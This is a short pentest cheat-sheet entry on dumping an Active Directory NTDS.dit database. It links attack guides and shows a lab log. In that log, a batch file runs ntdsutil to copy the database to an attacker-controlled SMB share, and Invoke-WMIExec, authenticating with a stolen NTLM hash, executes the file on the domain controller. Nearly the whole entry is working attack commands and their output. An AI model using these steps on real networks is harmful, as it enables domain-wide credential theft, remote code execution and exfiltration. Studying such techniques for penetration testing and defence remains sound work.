## Dump NTDS.dit file:

How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398

How-to-dump-windows2012-credentials: https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-dump-windows2012-credentials.md

Invoke-TheHash: https://github.com/Kevin-Robertson/Invoke-TheHash
```
root@kali:/mnt/smb_share/temp# cat ../exp.bat 
ntdsutil "ac i ntds" "ifm" "create full \\192.168.136.128\kali_smb_share\temp" q q

PS C:\> Invoke-WMIExec -verbose -Domain test.local -Username master -Hash 4557b6a0a22dc7cafd03c4a40e77f7e1 -Target 192.168.136.130 -Command "cmd /c \\192.168.136.128\kali_smb_share\exp.bat"
VERBOSE: Connecting to 192.168.136.130:135
VERBOSE: WMI reports target hostname as WIN-PJNUFB8U83P
VERBOSE: test.local\master accessed WMI on 192.168.136.130
VERBOSE: Using WIN-PJNUFB8U83P for random port extraction
VERBOSE: Connecting to 192.168.136.130:49154
VERBOSE: Attempting command execution
Command executed with process ID 3116 on 192.168.136.130
```
